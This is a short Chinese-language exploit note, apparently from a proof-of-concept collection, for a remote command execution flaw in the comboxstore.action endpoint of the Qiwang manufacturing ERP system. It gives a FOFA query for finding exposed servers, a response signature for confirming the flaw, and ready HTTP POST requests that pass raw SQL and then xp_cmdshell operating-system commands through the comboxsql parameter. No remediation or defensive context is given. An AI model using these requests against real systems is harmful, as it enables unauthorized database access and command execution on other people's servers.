# 企望制造 ERP comboxstore.action 远程命令执行漏洞

## 网络测绘

fofa: app="企望-ERP系统" || title="企望制造ERP系统"

## POC / EXP

```
/mainFunctions/comboxstore.action
返回 {'data':[]} 存在漏洞
```

```
# SQL
POST /mainFunctions/comboxstore.action HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 

comboxsql=select%20@@version;
```

```
# xp_cmdshell
POST /mainFunctions/comboxstore.action HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 

comboxsql=exec%20xp_cmdshell%20'whoami'
```